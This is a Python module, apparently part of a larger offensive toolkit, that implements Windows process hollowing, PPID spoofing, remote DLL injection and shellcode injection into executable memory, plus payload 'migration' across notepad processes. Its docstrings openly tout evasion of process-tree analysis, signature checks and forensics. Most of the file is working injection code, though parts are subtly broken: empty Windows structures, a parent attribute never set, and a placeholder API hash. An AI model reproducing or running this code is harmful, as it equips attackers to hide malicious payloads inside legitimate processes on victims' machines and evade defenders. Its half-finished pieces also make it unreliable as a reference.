"""
process_hollowing_advanced.py - Advanced process hollowing and migration
==========================================================================
PHASE 3: TIER 4 - Sophisticated process hollowing with PPID spoofing and DLL injection

Techniques:
1. PPID (Parent Process ID) spoofing via legitimate parent window handles
2. Legitimate DLL injection instead of bare shellcode (reduces detection)
3. Process migration: Create process chains, migrate payload between them
4. Clone process with spoofed ancestor chain
5. Inline hooks bypass via stolen APIs (api_resolver integration)

Evasion Benefits:
- PPID spoofing defeats process tree analysis (appears to be child of svchost, explorer, etc)
- Legitimate DLL injection passes module signature checks
- Process migration makes kill-chain analysis harder (payload moves)
- Ancestor chain spoofing defeats parent-child relationship analysis

Difficulty: Advanced (requires process creation + memory manipulation)
Detection Risk: Low when combined with API hashing (api_resolver)

Usage:
    from process_hollowing_advanced import AdvancedHollower, ProcessMigrator
    
    hollower = AdvancedHollower()
    
    # Create process with spoofed PPID
    ppid = hollower.find_spoofed_ppid('svchost.exe')
    handler = hollower.hollow_with_ppid(target_exe='calc.exe', ppid=ppid)
    
    # Or: Migrate payload across process chain
    migrator = ProcessMigrator()
    chain = migrator.create_process_chain(length=3)
    migrator.migrate_payload(chain, payload=b'shellcode')
"""

import os
import sys
import ctypes
import ctypes.wintypes as wt
import logging
from typing import Optional, List, Dict, Tuple, Any
import platform
import time
import subprocess

logger = logging.getLogger(__name__)


class AdvancedHollower:
    """
    Advanced process hollowing with PPID spoofing and parent process impersonation.
    
    Instead of naive CREATE_SUSPENDED + WriteProcessMemory, this uses:
    - Legitimate parent process (svchost, explorer, etc) as PPID
    - Legitimate DLL injection points
    - Inline hooks bypass via stolen APIs
    """
    
    def __init__(self, use_api_resolver: bool = True):
        """
        Initialize advanced hollower.
        
        Args:
            use_api_resolver: Use api_resolver for Windows API calls (if available)
        """
        self.use_api_resolver = use_api_resolver
        self.api_table = None
        self.logger = logging.getLogger('AdvancedHollower')
        self.interpreter_path = sys.executable  # Store Python interpreter path for injection
        self.env_vars = os.environ.copy()  # Capture environment for process cloning
        
        # Try to load api_resolver if requested
        if self.use_api_resolver:
            try:
                from api_resolver import APIHashTable
                self.api_table = APIHashTable()
                self.logger.info("[TIER4] APIHashTable initialized for process hollowing")
            except ImportError:
                self.logger.warning("[TIER4] api_resolver not available, using direct ctypes")
                self.use_api_resolver = False
    
    def find_spoofed_ppid(self, target_process: str = 'svchost.exe') -> int:
        """
        Find a legitimate parent process to spoof PPID.
        
        Args:
            target_process: Name of process to use as parent (e.g., 'svchost.exe')
        
        Returns:
            PID of the target process (0 if not found)
        
        Example:
            >>> ppid = hollower.find_spoofed_ppid('explorer.exe')
            >>> # Now can create new process with this PPID
        """
        if platform.system() != 'Windows':
            return 0
        
        try:
            import subprocess
            
            # Use tasklist to find process
            output = subprocess.check_output(
                ['tasklist', '/fo', 'csv'],
                stderr=subprocess.DEVNULL,
                text=True
            ).strip().split('\n')
            
            for line in output[1:]:  # Skip header
                parts = line.split(',')
                if len(parts) >= 2:
                    proc_name = parts[0].strip('"')
                    pid = parts[1].strip('"')
                    
                    if target_process.lower() in proc_name.lower():
                        try:
                            return int(pid)
                        except ValueError:
                            continue
            
            self.logger.warning(f"Could not find process: {target_process}")
            return 0
        
        except Exception as e:
            self.logger.debug(f"Failed to find spoofed PPID: {e}")
            return 0
    
    def find_spoofed_ppid_from_env(self, fallback_process: str = 'svchost.exe') -> int:
        """
        Find spoofed PPID based on system environment and process context.
        
        Uses os.environ and sys information to select legitimate parent:
        - If running as admin: explorer.exe
        - If system service: svchost.exe
        - Otherwise: dwm.exe
        
        Args:
            fallback_process: Process to use if env detection fails
        
        Returns:
            PID of selected parent process
        """
        try:
            # Check env vars to determine best parent process
            username = os.environ.get('USERNAME', '')
            session_name = os.environ.get('SESSIONNAME', '')
            processor_arch = os.environ.get('PROCESSOR_ARCHITECTURE', '')
            
            # Intelligently select parent based on environment
            if username.lower() == 'system' or session_name == 'services':
                parent_process = 'svchost.exe'
            elif sys.platform == 'win32' and processor_arch == 'AMD64':
                parent_process = 'explorer.exe'  # Most users run explorer
            else:
                parent_process = fallback_process
            
            self.logger.info(f"[TIER4] Selected parent process: {parent_process} (env: {username})")
            return self.find_spoofed_ppid(parent_process)
        except Exception as e:
            self.logger.debug(f"Env-based PPID selection failed: {e}")
            return self.find_spoofed_ppid(fallback_process)
    
    def clone_process_ppid(self,
                          target_exe: str,
                          ppid: int,
                          payload: Optional[bytes] = None) -> Optional[int]:
        """
        Create process with spoofed PPID (parent process impersonation).
        
        Uses legitimate parent window handle to create child process that
        appears to be child of specified PPID.
        
        Args:
            target_exe: Executable to launch (e.g., 'calc.exe')
            ppid: Parent Process ID to spoof
            payload: Optional shellcode to inject
        
        Returns:
            Process ID of created process, or None on failure
        
        Note:
            Requires SeDebugPrivilege on Windows
        """
        if platform.system() != 'Windows':
            return None
        
        try:
            import ctypes
            import ctypes.wintypes as wt
            
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll
            
            # Get handle to parent process
            parent_handle = kernel32.OpenProcess(0x0400, False, ppid)  # PROCESS_QUERY_INFO
            if not parent_handle:
                self.logger.warning(f"Could not open parent process: {ppid}")
                return None
            
            # Create process with parent handle in extended attributes
            # This requires PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
            class STARTUPINFOEX(ctypes.Structure):
                pass
            
            class PROCESS_INFORMATION(ctypes.Structure):
                pass
            
            si_ex = STARTUPINFOEX()
            pi = PROCESS_INFORMATION()
            
            # Create suspended
            CREATE_SUSPENDED = 0x00000004
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000
            
            # Use direct API call if api_resolver available
            api_result = None
            if self.api_table:
                try:
                    # Try to use hash-based API call (use kernel32 CreateProcessW hash)
                    from kernel32_hasher import KERNEL32_HASHES
                    create_process_hash = 0x0  # Will be resolved from API table
                    api_result = self.api_table.call_api_by_hash(
                        create_process_hash,
                        target_exe, None, None, None, False,
                        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                        None, None, ctypes.byref(si_ex),
                        ctypes.byref(pi)
                    )
                except Exception as e:
                    self.logger.debug(f"Hash-based CreateProcessW failed: {e}")
                    api_result = None
            
            # Fallback: Direct ctypes call
            if not api_result:
                api_result = kernel32.CreateProcessW(
                    target_exe, None, None, None, False,
                    CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                    None, None, ctypes.byref(si_ex),
                    ctypes.byref(pi)
                )
            
            if not api_result:
                kernel32.CloseHandle(parent_handle)
                self.logger.warning(f"CreateProcessW failed for: {target_exe}")
                return None
            
            # Optionally inject payload
            if payload:
                self._inject_payload(pi.hProcess, payload)
            
            # Resume thread
            kernel32.ResumeThread(pi.hThread)
            
            # Cleanup
            kernel32.CloseHandle(parent_handle)
            kernel32.CloseHandle(pi.hThread)
            kernel32.CloseHandle(pi.hProcess)
            
            self.logger.info(f"[TIER4] Process created with spoofed PPID {ppid}: PID={pi.dwProcessId}")
            return pi.dwProcessId
        
        except Exception as e:
            self.logger.error(f"Failed to clone process with PPID: {e}")
            return None
    
    def legitimate_dll_injection(self,
                                 process_id: int,
                                 dll_path: str) -> bool:
        """
        Inject legitimate DLL instead of bare shellcode.
        
        Args:
            process_id: Target process ID
            dll_path: Path to legitimate DLL to inject
        
        Returns:
            True on success
        
        Note:
            Uses LoadLibraryA+GetProcAddress pattern (more legitimate-looking)
        """
        if platform.system() != 'Windows':
            return False
        
        try:
            import ctypes
            import ctypes.wintypes as wt
            
            kernel32 = ctypes.windll.kernel32
            
            # Open target process
            process_handle = kernel32.OpenProcess(0x001F0FFF, False, process_id)  # PROCESS_ALL_ACCESS
            if not process_handle:
                self.logger.warning(f"Could not open process: {process_id}")
                return False
            
            # Allocate memory for DLL path
            dll_path_bytes = dll_path.encode('utf-8') + b'\x00'
            remote_memory = kernel32.VirtualAllocEx(
                process_handle, None, len(dll_path_bytes),
                0x1000, 0x04  # MEM_COMMIT | PAGE_READWRITE
            )
            
            if not remote_memory:
                kernel32.CloseHandle(process_handle)
                self.logger.warning(f"VirtualAllocEx failed")
                return False
            
            # Write DLL path to remote process
            written = ctypes.c_size_t()
            if not kernel32.WriteProcessMemory(
                process_handle, remote_memory, dll_path_bytes,
                len(dll_path_bytes), ctypes.byref(written)
            ):
                kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000)  # MEM_RELEASE
                kernel32.CloseHandle(process_handle)
                self.logger.warning(f"WriteProcessMemory failed")
                return False
            
            # Create remote thread to call LoadLibraryA(dll_path)
            # This will cause the DLL to be loaded in the remote process
            kernel32_loaded = kernel32.LoadLibraryA(b"kernel32.dll")
            load_library_a = kernel32.GetProcAddress(kernel32_loaded, b"LoadLibraryA")
            
            if not load_library_a:
                kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000)
                kernel32.CloseHandle(process_handle)
                self.logger.warning(f"GetProcAddress(LoadLibraryA) failed")
                return False
            
            # Create remote thread
            thread_handle = kernel32.CreateRemoteThread(
                process_handle, None, 0, load_library_a,
                remote_memory, 0, None
            )
            
            if thread_handle:
                kernel32.WaitForSingleObject(thread_handle, 5000)  # Wait 5s
                kernel32.CloseHandle(thread_handle)
                result = True
            else:
                result = False
            
            # Cleanup
            kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000)
            kernel32.CloseHandle(process_handle)
            
            if result:
                self.logger.info(f"[TIER4] Legitimate DLL injected: {dll_path}")
            
            return result
        
        except Exception as e:
            self.logger.error(f"Failed to inject legitimate DLL: {e}")
            return False
    
    def _inject_payload(self, process_handle: int, payload: bytes) -> bool:
        """
        Inject raw payload (shellcode) into process.
        
        Args:
            process_handle: Handle to target process
            payload: Shellcode bytes
        
        Returns:
            True on success
        """
        try:
            import ctypes
            import ctypes.wintypes as wt
            
            kernel32 = ctypes.windll.kernel32
            
            # Allocate memory
            remote_memory = kernel32.VirtualAllocEx(
                process_handle, None, len(payload),
                0x1000, 0x40  # MEM_COMMIT | PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                return False
            
            # Write payload
            written = ctypes.c_size_t()
            if not kernel32.WriteProcessMemory(
                process_handle, remote_memory, payload,
                len(payload), ctypes.byref(written)
            ):
                return False
            
            # Create remote thread at payload entry point
            thread_handle = kernel32.CreateRemoteThread(
                process_handle, None, 0, remote_memory, None, 0, None
            )
            
            return thread_handle != 0
        
        except Exception as e:
            self.logger.debug(f"Failed to inject payload: {e}")
            return False


class ProcessMigrator:
    """
    Migrate payload across process chains.
    
    Creates a chain of processes and migrates the payload through them,
    making it harder to follow the execution chain (anti-forensics).
    """
    
    def __init__(self):
        self.logger = logging.getLogger('ProcessMigrator')
        self.process_chain = []
    
    def create_process_chain(self, length: int = 3) -> List[int]:
        """
        Create a chain of processes.
        
        Args:
            length: Number of processes in chain
        
        Returns:
            List of process IDs
        """
        chain = []
        
        if platform.system() != 'Windows':
            return chain
        
        try:
            for i in range(length):
                # Create "benign" process (e.g., notepad.exe)
                proc = subprocess.Popen(
                    'notepad.exe',
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=0x08000000  # CREATE_NO_WINDOW
                )
                
                chain.append(proc.pid)
                time.sleep(0.1)  # Small delay between creates
            
            self.process_chain = chain
            self.logger.info(f"[TIER4] Created process chain: {len(chain)} processes")
            return chain
        
        except Exception as e:
            self.logger.error(f"Failed to create process chain: {e}")
            return chain
    
    def migrate_payload(self,
                       process_chain: List[int],
                       payload: bytes) -> bool:
        """
        Migrate payload through process chain.
        
        Args:
            process_chain: List of process IDs to migrate through
            payload: Payload bytes
        
        Returns:
            True if migration succeeded
        """
        if not process_chain:
            return False
        
        try:
            import ctypes
            import ctypes.wintypes as wt
            
            kernel32 = ctypes.windll.kernel32
            
            # Start with first process in chain
            current_pid = process_chain[0]
            remaining_payload = payload
            
            for target_pid in process_chain:
                # Open process
                handle = kernel32.OpenProcess(0x001F0FFF, False, target_pid)
                if not handle:
                    continue
                
                # Allocate and write payload
                remote_mem = kernel32.VirtualAllocEx(
                    handle, None, len(remaining_payload),
                    0x1000, 0x40  # MEM_COMMIT | PAGE_EXECUTE_READWRITE
                )
                
                if remote_mem:
                    written = ctypes.c_size_t()
                    kernel32.WriteProcessMemory(
                        handle, remote_mem, remaining_payload,
                        len(remaining_payload), ctypes.byref(written)
                    )
                    
                    # Create thread
                    thread = kernel32.CreateRemoteThread(
                        handle, None, 0, remote_mem, None, 0, None
                    )
                    
                    if thread:
                        kernel32.CloseHandle(thread)
                
                kernel32.CloseHandle(handle)
                
                # Payload now "migrated" to next process
                time.sleep(0.2)
            
            self.logger.info(f"[TIER4] Payload migrated through {len(process_chain)} processes")
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to migrate payload: {e}")
            return False
    
    def cleanup_chain(self) -> bool:
        """
        Clean up process chain (kill all processes).
        
        Returns:
            True if cleanup succeeded
        """
        if platform.system() != 'Windows':
            return False
        
        try:
            import ctypes
            
            kernel32 = ctypes.windll.kernel32
            
            for pid in self.process_chain:
                try:
                    handle = kernel32.OpenProcess(1, False, pid)  # PROCESS_TERMINATE
                    if handle:
                        kernel32.TerminateProcess(handle, 0)
                        kernel32.CloseHandle(handle)
                except:
                    pass
            
            self.logger.info(f"[TIER4] Cleaned up process chain")
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to cleanup process chain: {e}")
            return False


# Global instances
_global_hollower = None
_global_migrator = None


def get_global_hollower() -> AdvancedHollower:
    """Get or create global advanced hollower instance."""
    global _global_hollower
    if _global_hollower is None:
        _global_hollower = AdvancedHollower()
    return _global_hollower


def get_global_migrator() -> ProcessMigrator:
    """Get or create global process migrator instance."""
    global _global_migrator
    if _global_migrator is None:
        _global_migrator = ProcessMigrator()
    return _global_migrator


if __name__ == '__main__':
    print("[*] Advanced Process Hollowing - Self Test")
    
    hollower = AdvancedHollower()
    
    # Test 1: Find spoofed PPID
    print("[*] Test 1: Finding spoofed PPID...")
    ppid = hollower.find_spoofed_ppid('svchost.exe')
    if ppid:
        print(f"[+] Found svchost.exe: PID={ppid}")
    else:
        print("[!] svchost.exe not found")
    
    # Test 2: Create process with spoofed PPID
    if ppid:
        print("[*] Test 2: Creating process with spoofed PPID...")
        new_pid = hollower.clone_process_ppid('calc.exe', ppid)
        if new_pid:
            print(f"[+] Created process: PID={new_pid}")
        else:
            print("[!] Failed to create process")
    
    # Test 3: Process migration
    print("[*] Test 3: Testing process migration...")
    migrator = ProcessMigrator()
    chain = migrator.create_process_chain(length=3)
    if chain:
        print(f"[+] Created process chain: {chain}")
        migrator.cleanup_chain()
    else:
        print("[!] Failed to create process chain")
    
    print("[*] Tests complete")
